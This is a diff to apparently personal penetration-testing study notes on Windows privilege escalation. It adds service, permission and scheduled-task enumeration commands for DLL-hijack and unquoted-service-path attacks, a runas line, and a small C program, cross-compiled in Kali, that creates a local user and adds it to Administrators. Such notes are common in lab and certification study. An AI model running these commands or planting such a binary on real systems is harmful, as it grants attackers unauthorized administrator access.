@@ -122,7 +122,12 @@ Windows Privesc:
             Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
         Running Processes:
             Get-Process
-
+        Running proccess only on RDP (if no high permission)
+            Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+        Running processes for DLL hijack and unquoted service path attacks (both running and stopped processes (cant use stopped for DLL and service binary hijack):
+            wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+        Check for file permissions:
+            icacls "C:\xampp\apache\bin\httpd.exe"
         Search for files:
             Get-ChildItem -Path C:\ -Include *.<file.extention> -File -Recurse -ErrorAction SilentlyContinue
 
@@ -130,6 +135,30 @@ Windows Privesc:
             Get-History
             (Get-PSReadlineOption).HistorySavePath
 
+        Run Commands as differnt user ( when we already know password and we are running RDP):
+            runas /user:backupadmin cmd
+
+    Abusin Scheduled Tasks:
+        Display Tasks:
+            schtasks /query /fo LIST /v
+            Get-ScheduledTask
+
+Cross compileing c program into binary for 64bit Windows in Kali
+
+        x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+        code inside:
+            #include <stdlib.h>
+            
+            int main ()
+            {
+              int i;
+              
+              i = system ("net user dave2 password123! /add");
+              i = system ("net localgroup administrators dave2 /add");
+        
+              return 0;
+            }
+            
 Password Shit:
         Hydra:
 
